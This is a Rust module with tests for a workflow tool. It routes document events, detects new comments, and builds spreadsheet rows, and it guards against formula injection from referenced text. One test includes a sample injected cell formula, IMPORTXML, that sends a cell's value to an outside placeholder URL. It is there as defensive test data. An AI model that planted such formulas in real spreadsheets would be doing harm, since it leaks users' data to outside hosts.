//! Watching documents for workflows (PDT-318), pure: which copy of a `document.*` event a workflow's trigger takes,
//! which comments are new since the last look, and the rows a sheet step writes.
//!
//! A document can be linked to several projects, so its events are logged once per project (pdt-api's
//! `documents::watch`). A project workflow takes its project's copy; a host workflow, or a trigger that names the
//! document, takes exactly one, so nothing runs twice for one change.

use crate::document::DocumentComment;
use crate::ticket::Actor;
use crate::workflow::api::Scope;
use crate::workflow::events::DocumentRef;
use serde_json::Value;
use std::collections::HashSet;

/// Whether a trigger takes this copy of a document event. `document` is the trigger's (an id or exact title; None for
/// any document in scope), `projects` its project filter, `wf_project` the workflow's project.
pub fn accepts_copy(
    scope: Scope,
    wf_project: Option<&str>,
    document: Option<&str>,
    projects: &[String],
    doc: &DocumentRef,
) -> bool {
    let document = document.map(str::trim).filter(|d| !d.is_empty());
    if let Some(d) = document
        && d != doc.document_id
        && !d.eq_ignore_ascii_case(doc.title.trim())
    {
        return false;
    }
    let copies: Vec<&str> =
        if doc.project_ids.is_empty() { vec![""] } else { doc.project_ids.iter().map(String::as_str).collect() };
    let candidates: Vec<&str> = match projects.is_empty() {
        true => copies.clone(),
        false => copies.iter().copied().filter(|c| projects.iter().any(|p| p == c)).collect(),
    };
    let chosen = wf_project.filter(|p| candidates.contains(p)).or_else(|| candidates.first().copied());
    let this = doc.project_id.as_str();
    if document.is_some() {
        return chosen == Some(this);
    }
    match scope {
        Scope::Project => wf_project == Some(this) && !this.is_empty(),
        Scope::Host => chosen == Some(this),
        Scope::Personal => doc.project_ids.is_empty(),
    }
}

/// A comment or reply the last look didn't see.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NewComment {
    pub comment_id: String,
    /// The comment whose thread it is in.
    pub thread: String,
    pub reply: bool,
    pub author: String,
    pub by_user: bool,
    pub body: String,
    pub quote: Option<String>,
}

/// Every comment's and reply's id, to remember as seen.
pub fn comment_ids(comments: &[DocumentComment]) -> Vec<String> {
    comments.iter().flat_map(|c| std::iter::once(c.id.clone()).chain(c.replies.iter().map(|r| r.id.clone()))).collect()
}

/// Whether an agent or a workflow wrote it: those never start a run, so an agent replying to comments doesn't answer
/// itself.
fn by_pdt(actor: Option<Actor>) -> bool {
    matches!(actor, Some(Actor::Agent | Actor::System))
}

/// The comments and replies not in `seen`, oldest first as the provider lists them: not the ones PDT wrote (`ours`,
/// or an agent's or workflow's), nor those in resolved threads.
pub fn new_comments(comments: &[DocumentComment], seen: &HashSet<String>, ours: &HashSet<String>) -> Vec<NewComment> {
    let fresh = |id: &str| !seen.contains(id) && !ours.contains(id);
    let mut out = vec![];
    for c in comments.iter().filter(|c| !c.resolved) {
        if fresh(&c.id) && !by_pdt(c.actor) {
            out.push(NewComment {
                comment_id: c.id.clone(),
                thread: c.id.clone(),
                reply: false,
                author: c.author.clone(),
                by_user: c.actor == Some(Actor::User),
                body: c.body.clone(),
                quote: c.quote.clone(),
            });
        }
        for r in c.replies.iter().filter(|r| fresh(&r.id) && !by_pdt(r.actor)) {
            out.push(NewComment {
                comment_id: r.id.clone(),
                thread: c.id.clone(),
                reply: true,
                author: r.author.clone(),
                by_user: r.actor == Some(Actor::User),
                body: r.body.clone(),
                quote: c.quote.clone(),
            });
        }
    }
    out
}

/// A cell's text as a sheet step writes it: numbers and booleans as written, null as empty.
fn cell_text(v: &Value) -> String {
    match v {
        Value::Null => String::new(),
        Value::String(s) => s.clone(),
        other => other.to_string(),
    }
}

/// The rows a sheet step writes, from its config (references resolved): a list of rows (each a list of cells), one
/// row (a list of cells), one cell, or any of those as JSON text.
pub fn rows_of(v: &Value) -> Result<Vec<Vec<String>>, String> {
    let rows = match v {
        Value::Array(items) if items.is_empty() => return Err("rows is empty".into()),
        Value::Array(items) if items.iter().all(Value::is_array) => items
            .iter()
            .map(|r| match r {
                Value::Array(cells) if cells.iter().any(Value::is_object) => Err("a cell is an object".to_string()),
                Value::Array(cells) => Ok(cells.iter().map(cell_text).collect()),
                _ => unreachable!(),
            })
            .collect::<Result<Vec<_>, _>>()?,
        Value::Array(cells) if cells.iter().any(|c| c.is_array() || c.is_object()) => {
            return Err("give a list of rows (each a list of cells) or one row of cells".into());
        }
        Value::Array(cells) => vec![cells.iter().map(cell_text).collect()],
        Value::String(s) if s.trim_start().starts_with('[') => {
            let parsed: Value = serde_json::from_str(s).map_err(|e| format!("rows is not JSON: {e}"))?;
            return rows_of(&parsed);
        }
        Value::Object(_) => return Err("give a list of rows (each a list of cells), not an object".into()),
        Value::Null => return Err("rows is empty".into()),
        other => vec![vec![cell_text(other)]],
    };
    if rows.iter().all(Vec::is_empty) {
        return Err("rows has no cells".into());
    }
    Ok(rows)
}

/// Whether a cell's text would be taken for a formula (or lose its leading quote) where a sheet reads what is typed:
/// `=…`, `'…`, and `+…`, `-…` or `@…` that aren't plain numbers.
fn reads_as_formula(v: &str) -> bool {
    match v.chars().next() {
        Some('=' | '\'') => true,
        Some('+' | '-' | '@') => v.trim().parse::<f64>().is_err(),
        _ => false,
    }
}

/// Text that came into a sheet step's cells from references (`{{trigger.ticketTitle}}`), kept as text: a cell whose
/// config holds a reference and whose value would read as a formula gets a leading `'`, which every sheet takes as
/// "this is text" (a ticket title `=IMPORTXML(…)` must never run). Formulas written into the config itself still run.
/// `raw` is the field as written (before references were filled in), `rows` what [`rows_of`] made of it filled in.
pub fn text_from_refs(raw: &Value, rows: &mut [Vec<String>]) {
    let from_ref = |r: usize, c: usize| -> bool {
        let cell = match raw {
            Value::Array(items) if items.iter().all(Value::is_array) => items.get(r).and_then(|row| row.get(c)),
            Value::Array(cells) if r == 0 => cells.get(c),
            Value::Array(_) => None,
            // The whole field is a reference (or text holding one): every cell came from it.
            Value::String(s) => return crate::workflow::refs::has_ref(s),
            _ => None,
        };
        cell.and_then(Value::as_str).is_some_and(crate::workflow::refs::has_ref)
    };
    for (r, row) in rows.iter_mut().enumerate() {
        for (c, v) in row.iter_mut().enumerate() {
            if from_ref(r, c) && reads_as_formula(v) {
                v.insert(0, '\'');
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::document::CommentReply;
    use serde_json::json;

    fn doc(this: &str, linked: &[&str]) -> DocumentRef {
        DocumentRef {
            project_id: this.into(),
            document_id: "d1".into(),
            title: "Design".into(),
            kind: "doc".into(),
            provider: "local".into(),
            project_ids: linked.iter().map(|p| p.to_string()).collect(),
            ..Default::default()
        }
    }

    #[test]
    fn a_project_workflow_takes_its_projects_copy() {
        let take = |this| accepts_copy(Scope::Project, Some("b"), None, &[], &doc(this, &["a", "b"]));
        assert!(!take("a"));
        assert!(take("b"));
        assert!(!accepts_copy(Scope::Project, Some("b"), None, &[], &doc("", &[])), "an unlinked document");
    }

    #[test]
    fn a_host_workflow_takes_one_copy() {
        let take = |this, projects: &[String]| accepts_copy(Scope::Host, None, None, projects, &doc(this, &["a", "b"]));
        assert!(take("a", &[]) && !take("b", &[]));
        let only_b = ["b".to_string()];
        assert!(!take("a", &only_b) && take("b", &only_b), "the first copy its projects let in");
        assert!(accepts_copy(Scope::Host, None, None, &[], &doc("", &[])), "an unlinked document's one copy");
    }

    #[test]
    fn a_personal_workflow_takes_unlinked_documents() {
        assert!(accepts_copy(Scope::Personal, None, None, &[], &doc("", &[])));
        assert!(!accepts_copy(Scope::Personal, None, None, &[], &doc("a", &["a"])));
    }

    #[test]
    fn a_named_document_is_taken_once_wherever_it_is_linked() {
        let take =
            |scope, wf: Option<&str>, this, given| accepts_copy(scope, wf, Some(given), &[], &doc(this, &["a", "b"]));
        // By id or title; the workflow's own project's copy when it has one, else the first.
        assert!(take(Scope::Project, Some("b"), "b", "d1") && !take(Scope::Project, Some("b"), "a", "d1"));
        assert!(take(Scope::Project, Some("z"), "a", "design"), "a project it isn't linked to: the first copy");
        assert!(take(Scope::Host, None, "a", "Design") && !take(Scope::Host, None, "b", "Design"));
        assert!(!take(Scope::Host, None, "a", "d2"), "another document");
        assert!(accepts_copy(Scope::Personal, None, Some("d1"), &[], &doc("", &[])));
    }

    fn comment(id: &str, actor: Option<Actor>, replies: Vec<CommentReply>) -> DocumentComment {
        DocumentComment {
            id: id.into(),
            author: "Sam".into(),
            body: format!("body {id}"),
            quote: Some("Ship it".into()),
            anchor: None,
            resolved: false,
            created_at: None,
            replies,
            actor,
        }
    }

    fn reply(id: &str, actor: Option<Actor>) -> CommentReply {
        CommentReply { id: id.into(), author: "Ann".into(), body: format!("reply {id}"), created_at: None, actor }
    }

    #[test]
    fn new_comments_and_replies_are_the_ones_not_seen() {
        let list = vec![
            comment("c1", None, vec![reply("r1", Some(Actor::User)), reply("r2", Some(Actor::Agent))]),
            comment("c2", Some(Actor::User), vec![]),
            comment("c3", Some(Actor::System), vec![reply("r3", None)]),
            DocumentComment { resolved: true, ..comment("c4", None, vec![reply("r4", None)]) },
        ];
        let seen: HashSet<String> = ["c1".to_string()].into();
        let ours: HashSet<String> = ["r3".to_string()].into();
        let new = new_comments(&list, &seen, &ours);
        let got: Vec<_> = new.iter().map(|n| (n.comment_id.as_str(), n.thread.as_str(), n.reply, n.by_user)).collect();
        // Not an agent's (r2) or a workflow's (c3), not what PDT wrote (r3), not a resolved thread (c4).
        assert_eq!(got, [("r1", "c1", true, true), ("c2", "c2", false, true)]);
        assert_eq!(new[0].quote.as_deref(), Some("Ship it"), "a reply carries its thread's quote");
        assert_eq!(comment_ids(&list[..1]), ["c1", "r1", "r2"]);
    }

    #[test]
    fn text_from_references_never_runs_as_a_formula() {
        let raw = json!([["{{trigger.ticketKey}}", "{{trigger.ticketTitle}}", "=SUM(1,2)", "{{trigger.pr}}"]]);
        let mut rows =
            vec![vec!["P-1".into(), "=IMPORTXML(\"https://x/\"&A1)".into(), "=SUM(1,2)".into(), "-12".into()]];
        text_from_refs(&raw, &mut rows);
        assert_eq!(rows[0], ["P-1", "'=IMPORTXML(\"https://x/\"&A1)", "=SUM(1,2)", "-12"], "the typed formula runs");
        // One row of cells, a whole-field reference, and the other leading characters.
        let mut one = vec![vec!["+A1".to_string(), "@x".into(), "'quoted".into(), "+5".into()]];
        text_from_refs(&json!(["{{a}}", "{{b}}", "{{c}}", "{{d}}"]), &mut one);
        assert_eq!(one[0], ["'+A1", "'@x", "''quoted", "+5"]);
        let mut all = vec![vec!["=1+1".to_string()], vec!["ok".into()]];
        text_from_refs(&json!("{{steps.rows.output}}"), &mut all);
        assert_eq!(all, [vec!["'=1+1"], vec!["ok"]]);
        let mut typed = vec![vec!["=A1*2".to_string()]];
        text_from_refs(&json!([["=A1*2"]]), &mut typed);
        assert_eq!(typed[0], ["=A1*2"]);
    }

    #[test]
    fn rows_come_from_lists_cells_or_json() {
        assert_eq!(rows_of(&json!([["a", 1], [true, null]])).unwrap(), [vec!["a", "1"], vec!["true", ""]]);
        assert_eq!(rows_of(&json!(["PDT-1", 42])).unwrap(), [vec!["PDT-1", "42"]]);
        assert_eq!(rows_of(&json!("one")).unwrap(), [vec!["one"]]);
        assert_eq!(rows_of(&json!("[[\"a\",\"b\"]]")).unwrap(), [vec!["a", "b"]]);
        for bad in [json!([]), json!(null), json!({"a": 1}), json!([["x"], "y"]), json!([[]]), json!([[{"a": 1}]])] {
            assert!(rows_of(&bad).is_err(), "{bad}");
        }
    }
}
